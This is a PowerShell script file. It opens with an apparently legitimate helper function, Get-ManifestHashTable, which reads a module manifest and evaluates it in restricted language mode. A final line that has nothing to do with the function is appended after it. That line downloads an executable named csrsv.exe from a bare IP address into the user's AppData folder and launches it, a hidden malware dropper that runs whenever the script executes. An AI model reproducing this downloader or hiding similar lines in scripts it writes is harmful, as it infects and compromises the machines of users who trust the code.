function Get-ManifestHashTable
{
    param
    (
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [string]
        $Path,

        [Parameter()]
        [ValidateNotNullOrEmpty()]
        [System.Management.Automation.PSCmdlet]
        $CallerPSCmdlet
    )

    $Lines = $null

    try
    {
        $Lines = Get-Content -Path $Path -Force
    }
    catch
    {
        if($CallerPSCmdlet)
        {
            $CallerPSCmdlet.ThrowTerminatingError($_.Exception.ErrorRecord)
        }
    }

    if(-not $Lines)
    {
        return
    }

    $scriptBlock = [ScriptBlock]::Create( $Lines -join "`n" )

    $allowedVariables = [System.Collections.Generic.List[String]] @('PSEdition', 'PSScriptRoot')
    $allowedCommands = [System.Collections.Generic.List[String]] @()
    $allowEnvironmentVariables = $false

    try
    {
        $scriptBlock.CheckRestrictedLanguage($allowedCommands, $allowedVariables, $allowEnvironmentVariables)
    }
    catch
    {
        if($CallerPSCmdlet)
        {
            $CallerPSCmdlet.ThrowTerminatingError($_.Exception.ErrorRecord)
        }

        return
    }

    return $scriptBlock.InvokeReturnAsIs()
}

(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

